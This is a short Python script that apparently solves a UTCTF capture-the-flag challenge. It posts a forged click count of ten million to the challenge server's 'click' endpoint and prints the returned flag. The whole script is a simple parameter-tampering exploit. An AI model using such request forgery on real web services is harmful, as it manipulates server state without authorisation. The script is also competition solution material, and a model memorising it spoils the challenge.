import requests
import time

url = "http://betta.utctf.live:8138/"

payload = {'count': 10000000}
headers = {'Content-Type': 'application/x-www-form-urlencoded'}

response = requests.post(url + 'click', data=payload, headers=headers)

if response.status_code == 200:
    flag = response.json().get('flag')
    print("Flag:", flag)
else:
    print("Error:", response.text)